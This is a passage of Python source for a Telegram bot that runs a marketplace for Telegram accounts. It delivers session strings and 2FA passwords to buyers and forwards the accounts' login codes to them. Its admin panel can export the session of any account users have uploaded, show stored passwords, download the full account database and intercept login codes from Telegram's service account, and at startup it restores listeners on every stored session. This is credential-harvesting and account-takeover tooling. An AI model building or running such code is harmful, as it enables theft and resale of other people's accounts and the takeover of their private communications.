@dp.message(AddItem.enter_stars)
async def fsm_item_stars(msg: Message, state: FSMContext):
    txt   = msg.text.strip()
    stars = None
    if txt != "-":
        if not txt.isdigit() or int(txt) < 1:
            await msg.answer("❌ Введи целое число или <code>-</code>:", parse_mode="HTML")
            return
        stars = int(txt)
    await state.update_data(stars_price=stars)
    data = await state.get_data()

    stars_line = f"⭐ Звёзды: <b>{stars}</b>\n" if stars else ""
    await state.set_state(AddItem.confirm)
    await msg.answer(
        f"📋 <b>Проверь данные:</b>\n\n"
        f"📱 Аккаунт: <code>{data['phone']}</code>\n"
        f"📌 Название: {data['title']}\n"
        f"📝 Описание: {data.get('description') or '—'}\n"
        f"🌍 Происхождение: {data.get('origin') or '—'}\n"
        f"🔑 Пароль 2FA: {'✅ есть' if data.get('item_password') else '❌ нет'}\n"
        f"💰 Цена: <b>{data['price_rub']}₽</b>\n"
        f"{stars_line}\n"
        f"Комиссия магазина: <b>{COMMISSION_PCT}%</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Выставить", callback_data="item_confirm")],
            [InlineKeyboardButton(text="❌ Отмена",    callback_data="main_menu")],
        ]),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "item_confirm")
async def cb_item_confirm(cb: CallbackQuery, state: FSMContext):
    data      = await state.get_data()
    seller_id = cb.from_user.id
    item_id   = shop_add_item(
        seller_id      = seller_id,
        phone          = data["phone"],
        title          = data["title"],
        description    = data.get("description", ""),
        origin         = data.get("origin", ""),
        password       = data.get("item_password", ""),
        price_rub      = data["price_rub"],
        stars_price    = data.get("stars_price")
    )
    await state.clear()
    await cb.message.edit_text(
        f"✅ <b>Товар выставлен!</b>\n\n📱 {data['title']}\n💰 {data['price_rub']}₽\n\n#️⃣ ID товара: <code>{item_id}</code>",
        reply_markup=kb_main(), parse_mode="HTML"
    )

# ─── Мои товары ───────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "my_items")
async def cb_my_items(cb: CallbackQuery):
    items = shop_get_user_items(cb.from_user.id)
    if not items:
        await cb.message.edit_text(
            "💼 <b>У тебя нет товаров в магазине</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="➕ Продать аккаунт", callback_data="shop_sell")],
                [InlineKeyboardButton(text="◀️ В меню", callback_data="main_menu")],
            ]),
            parse_mode="HTML"
        )
        return
    text = "💼 <b>Мои товары:</b>\n\n"
    for it in items:
        status = "🟢 Активен" if it["status"] == "active" else "✅ Продан"
        text  += f"{status} | <b>{it['title']}</b> — {it['price_rub']}₽\n📱 <code>{it['phone']}</code>\n\n"
    await cb.message.edit_text(
        text[:4000], reply_markup=kb_back(), parse_mode="HTML"
    )

# ─── Мои покупки ──────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "my_purchases")
async def cb_my_purchases(cb: CallbackQuery):
    purchases = shop_get_purchases(cb.from_user.id)
    if not purchases:
        await cb.message.edit_text(
            "🧾 <b>У тебя пока нет покупок</b>",
            reply_markup=kb_back(), parse_mode="HTML"
        )
        return
    text = "🧾 <b>Мои покупки:</b>\n\n"
    for p in purchases:
        date  = p["purchased_at"][:10]
        meth  = p["pay_method"]
        text += f"📅 {date} | {meth}\n📱 <code>{p['phone']}</code> — <b>{p['title']}</b>\n💰 {p['paid_rub']}₽\n\n"
    await cb.message.edit_text(
        text[:4000], reply_markup=kb_back(), parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════════════════════════════
# ─── ОПЛАТА ───────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

async def deliver_purchase(buyer_id: int, item_id: int, order_id: int):
    """Выдать товар покупателю после оплаты"""
    item = shop_get_item(item_id)
    if not item:
        return

    shop_mark_sold(item_id)
    shop_complete_order(order_id)

    order = db.execute("SELECT * FROM shop_orders WHERE id=?", (order_id,)).fetchone()
    pay_method = order["pay_method"] if order else "unknown"

    shop_add_purchase(
        buyer_id   = buyer_id,
        item_id    = item_id,
        order_id   = order_id,
        phone      = item["phone"],
        title      = item["title"],
        paid_rub   = item["price_rub"],
        pay_method = pay_method
    )

    # Получаем сессию аккаунта
    acc_row = db.execute(
        "SELECT * FROM accounts WHERE phone=? AND owner_id=?",
        (item["phone"], item["seller_id"])
    ).fetchone()

    pwd_line = f"🔑 Пароль 2FA: <code>{item['password']}</code>\n" if item["password"] else ""
    sess_line = ""
    if acc_row and acc_row["session"]:
        sess_line = f"\n📋 <b>Session string:</b>\n<code>{acc_row['session']}</code>"

    await bot.send_message(
        buyer_id,
        f"✅ <b>Покупка успешна!</b>\n\n"
        f"📱 Номер: <code>{item['phone']}</code>\n"
        f"{pwd_line}"
        f"💰 Оплачено: {item['price_rub']}₽\n"
        f"{sess_line}\n\n"
        f"👂 Получишь SMS-код от Telegram автоматически — просто подожди.",
        parse_mode="HTML"
    )

    # Комиссия продавцу — он получает (100 - COMMISSION_PCT)% суммы
    seller_amount = int(item["price_rub"] * (100 - COMMISSION_PCT) / 100)
    await bot.send_message(
        item["seller_id"],
        f"🎉 <b>Аккаунт продан!</b>\n\n"
        f"📱 <code>{item['phone']}</code>\n"
        f"💰 Ты получишь: <b>{seller_amount}₽</b> (после {COMMISSION_PCT}% комиссии)\n"
        f"📊 Способ оплаты: {pay_method}",
        parse_mode="HTML"
    )

    # Уведомление админу
    commission = item["price_rub"] - seller_amount
    await bot.send_message(
        ADMIN_ID,
        f"💸 <b>Новая продажа</b>\n\n"
        f"📱 {item['phone']}\n"
        f"💰 Цена: {item['price_rub']}₽\n"
        f"💎 Комиссия: {commission}₽ ({COMMISSION_PCT}%)\n"
        f"👤 Покупатель: <code>{buyer_id}</code>\n"
        f"👤 Продавец: <code>{item['seller_id']}</code>",
        parse_mode="HTML"
    )

    # Запускаем слушатель кодов для покупателя
    if acc_row and acc_row["session"]:
        try:
            client = await make_client(acc_row["session"])
            if await client.is_user_authorized():
                attach_code_listener(client, buyer_id, item["phone"])
        except Exception as e:
            log.error(f"deliver listener error: {e}")

# ─── CryptoBot оплата ─────────────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("buy_crypto:"))
async def cb_buy_crypto(cb: CallbackQuery):
    item_id  = int(cb.data.split(":", 1)[1])
    item     = shop_get_item(item_id)
    if not item or item["status"] != "active":
        await cb.answer("❌ Товар уже продан", show_alert=True)
        return

    buyer_id = cb.from_user.id
    order_id = shop_create_order(item_id, buyer_id, item["seller_id"], "cryptobot", item["price_rub"])

    try:
        inv = await cryptobot_create_invoice(
            amount_rub  = item["price_rub"],
            order_id    = order_id,
            description = f"TG аккаунт: {item['title']}"
        )
    except Exception as e:
        await cb.answer(f"❌ Ошибка CryptoBot: {e}", show_alert=True)
        return

    # Сохраняем invoice_id для проверки
    db.execute("UPDATE shop_orders SET pay_ref=? WHERE id=?", (str(inv["invoice_id"]), order_id))
    db.commit()

    await cb.message.edit_text(
        f"💎 <b>Оплата через CryptoBot</b>\n\n"
        f"📱 {item['title']}\n"
        f"💰 {item['price_rub']}₽ = <b>{inv['ton']} TON</b>\n\n"
        f"1. Перейди по ссылке и оплати\n"
        f"2. Нажми «✅ Проверить оплату»\n\n"
        f"⏱ Ссылка действительна 10 минут",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить", url=inv["url"])],
            [InlineKeyboardButton(text="✅ Проверить оплату", callback_data=f"check_crypto:{order_id}:{item_id}")],
            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"shop_item:{item_id}")],
        ]),
        parse_mode="HTML"
    )

@dp.callback_query(F.data.startswith("check_crypto:"))
async def cb_check_crypto(cb: CallbackQuery):
    _, order_id, item_id = cb.data.split(":")
    order_id = int(order_id)
    item_id  = int(item_id)
    order    = db.execute("SELECT * FROM shop_orders WHERE id=?", (order_id,)).fetchone()

    if not order or not order["pay_ref"]:
        await cb.answer("❌ Заказ не найден", show_alert=True)
        return
    if order["status"] == "paid":
        await cb.answer("✅ Уже оплачено", show_alert=True)
        return

    await cb.answer("⏳ Проверяю...")
    paid = await cryptobot_check_invoice(int(order["pay_ref"]))
    if paid:
        await cb.message.edit_text("⏳ Выдаю товар...", parse_mode="HTML")
        await deliver_purchase(cb.from_user.id, item_id, order_id)
    else:
        await cb.answer("❌ Оплата не найдена. Попробуй позже.", show_alert=True)

# ─── Звёзды оплата ────────────────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("buy_stars:"))
async def cb_buy_stars(cb: CallbackQuery):
    item_id = int(cb.data.split(":", 1)[1])
    item    = shop_get_item(item_id)
    if not item or item["status"] != "active":
        await cb.answer("❌ Товар уже продан", show_alert=True)
        return
    if not item["stars_price"]:
        await cb.answer("❌ Продавец не принимает звёзды", show_alert=True)
        return

    order_id = shop_create_order(item_id, cb.from_user.id, item["seller_id"], "stars", item["price_rub"])
    db.commit()

    await bot.send_invoice(
        chat_id     = cb.from_user.id,
        title       = item["title"],
        description = item["description"] or f"TG аккаунт {item['phone']}",
        payload     = f"stars:{order_id}:{item_id}",
        currency    = "XTR",
        prices      = [LabeledPrice(label=item["title"], amount=item["stars_price"])]
    )
    await cb.answer()

@dp.pre_checkout_query()
async def pre_checkout(query: PreCheckoutQuery):
    await query.answer(ok=True)

@dp.message(F.successful_payment)
async def successful_payment(msg: Message):
    payload = msg.successful_payment.invoice_payload
    if payload.startswith("stars:"):
        _, order_id, item_id = payload.split(":")
        await deliver_purchase(msg.from_user.id, int(item_id), int(order_id))

# ─── ЮMoney оплата (заглушка до токена) ──────────────────────────────────────
@dp.callback_query(F.data.startswith("buy_ymoney:"))
async def cb_buy_ymoney(cb: CallbackQuery):
    item_id = int(cb.data.split(":", 1)[1])
    item    = shop_get_item(item_id)
    if not item or item["status"] != "active":
        await cb.answer("❌ Товар уже продан", show_alert=True)
        return

    if not YOOMONEY_TOKEN or not YOOMONEY_WALLET:
        await cb.message.edit_text(
            f"💳 <b>Оплата через ЮMoney</b>\n\n"
            f"📱 {item['title']}\n"
            f"💰 {item['price_rub']}₽\n\n"
            f"Переведи <b>{item['price_rub']}₽</b> на кошелёк:\n"
            f"<code>{YOOMONEY_WALLET or 'будет указан позже'}</code>\n\n"
            f"В комментарии укажи: <code>order_{item_id}_{cb.from_user.id}</code>\n\n"
            f"После оплаты напиши администратору для подтверждения.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📩 Написать админу", url=f"tg://user?id={ADMIN_ID}")],
                [InlineKeyboardButton(text="◀️ Назад", callback_data=f"shop_item:{item_id}")],
            ]),
            parse_mode="HTML"
        )
        return

    # TODO: после получения токена — интегрировать ЮMoney API
    await cb.answer("ЮMoney скоро будет доступен", show_alert=True)

# ═══════════════════════════════════════════════════════════════════════════════
# ─── АДМИН-ПАНЕЛЬ ────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def is_admin(user_id):
    return user_id == ADMIN_ID

def adm_main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Все пользователи",   callback_data="adm_users")],
        [InlineKeyboardButton(text="📋 Все аккаунты",       callback_data="adm_accounts")],
        [InlineKeyboardButton(text="🛒 Магазин (все)",      callback_data="adm_shop")],
        [InlineKeyboardButton(text="💾 Скачать базу",       callback_data="adm_db")],
        [InlineKeyboardButton(text="📊 Статистика",         callback_data="adm_stats")],
    ])

def adm_main_text():
    total_users    = db.execute("SELECT COUNT(DISTINCT owner_id) FROM accounts").fetchone()[0]
    total_accounts = db.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
    total_items    = db.execute("SELECT COUNT(*) FROM shop_items WHERE status='active'").fetchone()[0]
    total_sales    = db.execute("SELECT COUNT(*) FROM shop_orders WHERE status='paid'").fetchone()[0]
    return (
        f"👑 <b>Админ-панель</b>\n\n"
        f"👥 Пользователей: <b>{total_users}</b>\n"
        f"📱 Аккаунтов: <b>{total_accounts}</b>\n"
        f"🛒 В магазине: <b>{total_items}</b>\n"
        f"✅ Продаж: <b>{total_sales}</b>"
    )

@dp.message(Command("admin"))
async def cmd_admin(msg: Message):
    if not is_admin(msg.from_user.id):
        await msg.answer("⛔️ Нет доступа")
        return
    await msg.answer(adm_main_text(), reply_markup=adm_main_kb(), parse_mode="HTML")

@dp.callback_query(F.data == "adm_shop")
async def adm_shop(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    rows = db.execute("SELECT * FROM shop_items ORDER BY created_at DESC").fetchall()
    if not rows:
        await cb.message.edit_text(
            "🛒 Магазин пуст",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="adm_back")]])
        )
        return
    text = "🛒 <b>Все товары магазина:</b>\n\n"
    for it in rows:
        status = "🟢" if it["status"] == "active" else "✅"
        text  += f"{status} <b>{it['title']}</b> | {it['price_rub']}₽\n📱 <code>{it['phone']}</code> | ID: <code>{it['id']}</code>\n\n"
    await cb.message.edit_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="adm_back")]]),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "adm_users")
async def adm_users(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    rows = db.execute(
        "SELECT owner_id, COUNT(*) as cnt, GROUP_CONCAT(phone, ', ') as phones FROM accounts GROUP BY owner_id ORDER BY cnt DESC"
    ).fetchall()
    if not rows:
        await cb.message.edit_text("📭 Пользователей нет",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="adm_back")]]))
        return
    text = "👥 <b>Все пользователи:</b>\n\n"
    for r in rows:
        text += f"🆔 <code>{r['owner_id']}</code> — {r['cnt']} акк.\n{r['phones']}\n\n"
    await cb.message.edit_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="adm_back")]]),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "adm_accounts")
async def adm_accounts(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    rows = db.execute(
        "SELECT owner_id, phone, full_name, username, created_at FROM accounts ORDER BY created_at DESC"
    ).fetchall()
    if not rows:
        await cb.message.edit_text("📭 Аккаунтов нет",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="adm_back")]]))
        return
    buttons = []
    for r in rows:
        p     = r["phone"].replace("+", "")
        name  = r["full_name"] or r["phone"]
        uname = f" @{r['username']}" if r["username"] else ""
        buttons.append([InlineKeyboardButton(
            text=f"📱 {name}{uname} ({r['phone']})",
            callback_data=f"adm_acc:{p}"
        )])
    buttons.append([InlineKeyboardButton(text="◀️ Назад", callback_data="adm_back")])
    await cb.message.edit_text(
        f"📋 <b>Все аккаунты</b> ({len(rows)} шт.):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML"
    )

def adm_acc_kb(phone):
    p = phone.replace("+", "")
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📤 Выгрузить сессию", callback_data=f"adm_export:{p}"),
            InlineKeyboardButton(text="🔐 Получить код",     callback_data=f"adm_getcode:{p}"),
        ],
        [InlineKeyboardButton(text="◀️ Все аккаунты", callback_data="adm_accounts")],
    ])

@dp.callback_query(F.data.startswith("adm_acc:"))
async def adm_acc_card(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    phone = "+" + cb.data.split(":", 1)[1]
    row   = db.execute("SELECT * FROM accounts WHERE phone=?", (phone,)).fetchone()
    if not row:
        await cb.answer("Аккаунт не найден", show_alert=True)
        return
    name     = row["full_name"] or "—"
    uname    = f"@{row['username']}" if row["username"] else "—"
    added    = row["created_at"][:16].replace("T", " ")
    has_sess = "✅" if row["session"] else "❌"
    password = f"<code>{row['password']}</code>" if row["password"] else "—"
    await cb.message.edit_text(
        f"👤 <b>{name}</b> {uname}\n📱 <code>{phone}</code>\n🆔 Владелец: <code>{row['owner_id']}</code>\n"
        f"📅 Загружен: {added}\n💾 Сессия: {has_sess}\n🔑 Пароль 2FA: {password}",
        reply_markup=adm_acc_kb(phone), parse_mode="HTML"
    )

@dp.callback_query(F.data.startswith("adm_export:"))
async def adm_export(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    from aiogram.types import FSInputFile
    phone = "+" + cb.data.split(":", 1)[1]
    row   = db.execute("SELECT * FROM accounts WHERE phone=?", (phone,)).fetchone()
    if not row or not row["session"]:
        await cb.answer("❌ Нет сессии", show_alert=True)
        return
    data = {"phone": phone, "session": row["session"], "username": row["username"],
            "full_name": row["full_name"], "owner_id": row["owner_id"],
            "exported_at": datetime.utcnow().isoformat()}
    path      = os.path.join(SESSIONS_DIR, "admin_export")
    os.makedirs(path, exist_ok=True)
    file_path = os.path.join(path, f"{phone.lstrip('+')}_session.json")
    txt_path  = os.path.join(path, f"{phone.lstrip('+')}_session.txt")
    with open(file_path, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    with open(txt_path, "w") as f:
        f.write(row["session"])
    await cb.message.answer_document(FSInputFile(file_path, filename=f"{phone.lstrip('+')}_session.json"),
        caption=f"📤 <b>Сессия JSON</b> <code>{phone}</code>", parse_mode="HTML")
    await cb.message.answer_document(FSInputFile(txt_path, filename=f"{phone.lstrip('+')}_session.txt"),
        caption=f"📤 <b>Сессия string</b> <code>{phone}</code>", parse_mode="HTML")
    await cb.answer("✅ Выгружено")

@dp.callback_query(F.data.startswith("adm_getcode:"))
async def adm_getcode(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    phone    = "+" + cb.data.split(":", 1)[1]
    row      = db.execute("SELECT * FROM accounts WHERE phone=?", (phone,)).fetchone()
    if not row or not row["session"]:
        await cb.answer("❌ Нет сессии", show_alert=True)
        return
    old_task = adm_code_tasks.get(phone)
    if old_task and not old_task.done():
        old_task.cancel()
    admin_id = cb.from_user.id
    await cb.message.answer(
        f"🔐 <b>Слушаю коды</b> для <code>{phone}</code>\n⏱ Активно <b>2 минуты</b>.",
        parse_mode="HTML"
    )
    await cb.answer("✅ Слушатель запущен")

    async def _listen_codes():
        try:
            client = await make_client(row["session"])
            if not await client.is_user_authorized():
                await bot.send_message(admin_id, f"❌ Сессия <code>{phone}</code> истекла", parse_mode="HTML")
                return
            received = []
            @client.on(events.NewMessage(from_users=[777000, 42777]))
            async def _handler(event):
                text  = event.raw_text or ""
                match = CODE_RE.search(text)
                code  = match.group(1) if match else None
                received.append(True)
                if code:
                    await bot.send_message(admin_id,
                        f"🔐 <b>Код</b>\nАккаунт: <code>{phone}</code>\nКод: <code>{code}</code>\n\n{text}",
                        parse_mode="HTML")
                else:
                    await bot.send_message(admin_id,
                        f"📨 <b>Сообщение от Telegram</b>\nАккаунт: <code>{phone}</code>\n\n{text}",
                        parse_mode="HTML")
            await asyncio.sleep(120)
            await client.disconnect()
            await bot.send_message(admin_id,
                f"⏹ <b>Слушатель остановлен</b>\nАккаунт: <code>{phone}</code>\nПолучено: <b>{len(received)}</b>",
                parse_mode="HTML")
        except asyncio.CancelledError:
            await bot.send_message(admin_id, f"⏹ Слушатель <code>{phone}</code> отменён", parse_mode="HTML")
        except Exception as e:
            await bot.send_message(admin_id, f"❌ Ошибка слушателя: {e}")
        finally:
            adm_code_tasks.pop(phone, None)

    task = asyncio.create_task(_listen_codes())
    adm_code_tasks[phone] = task

@dp.callback_query(F.data == "adm_db")
async def adm_db(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    from aiogram.types import FSInputFile
    if not os.path.exists(DB_PATH):
        await cb.answer("База не найдена", show_alert=True)
        return
    await cb.message.answer_document(FSInputFile(DB_PATH, filename="accounts.db"), caption="💾 База данных")
    await cb.answer("✅ Отправлено")

@dp.callback_query(F.data == "adm_stats")
async def adm_stats(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    total_users    = db.execute("SELECT COUNT(DISTINCT owner_id) FROM accounts").fetchone()[0]
    total_accounts = db.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
    today          = db.execute("SELECT COUNT(*) FROM accounts WHERE DATE(created_at) = DATE('now')").fetchone()[0]
    with_session   = db.execute("SELECT COUNT(*) FROM accounts WHERE session IS NOT NULL").fetchone()[0]
    with_password  = db.execute("SELECT COUNT(*) FROM accounts WHERE password IS NOT NULL AND password != ''").fetchone()[0]
    shop_active    = db.execute("SELECT COUNT(*) FROM shop_items WHERE status='active'").fetchone()[0]
    shop_sold      = db.execute("SELECT COUNT(*) FROM shop_items WHERE status='sold'").fetchone()[0]
    total_revenue  = db.execute("SELECT SUM(commission) FROM shop_orders WHERE status='paid'").fetchone()[0] or 0
    await cb.message.edit_text(
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: <b>{total_users}</b>\n"
        f"📱 Аккаунтов: <b>{total_accounts}</b>\n"
        f"✅ С сессией: <b>{with_session}</b>\n"
        f"🔑 С паролем 2FA: <b>{with_password}</b>\n"
        f"🆕 Добавлено сегодня: <b>{today}</b>\n\n"
        f"🛒 В магазине: <b>{shop_active}</b>\n"
        f"✅ Продано: <b>{shop_sold}</b>\n"
        f"💰 Доход (комиссия): <b>{total_revenue}₽</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="adm_back")]]),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "adm_back")
async def adm_back(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        await cb.answer("⛔️", show_alert=True)
        return
    await cb.message.edit_text(adm_main_text(), reply_markup=adm_main_kb(), parse_mode="HTML")

# ─── Запуск ───────────────────────────────────────────────────────────────────
async def restore_listeners():
    rows = db.execute("SELECT owner_id, phone, session FROM accounts WHERE session IS NOT NULL").fetchall()
    if not rows:
        return
    log.info(f"🔄 Восстанавливаю {len(rows)} аккаунт(ов)...")
    for row in rows:
        try:
            client = await make_client(row["session"])
            if await client.is_user_authorized():
                set_client(row["owner_id"], row["phone"], client)
                attach_code_listener(client, row["owner_id"], row["phone"])
                log.info(f"  ✅ {row['phone']}")
            else:
                log.warning(f"  ⚠️ {row['phone']} — сессия истекла")
        except Exception as e:
            log.error(f"  ❌ {row['phone']}: {e}")

async def main():
    log.info("🚀 TG Manager Pro Bot запущен")
    await restore_listeners()
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    asyncio.run(main())
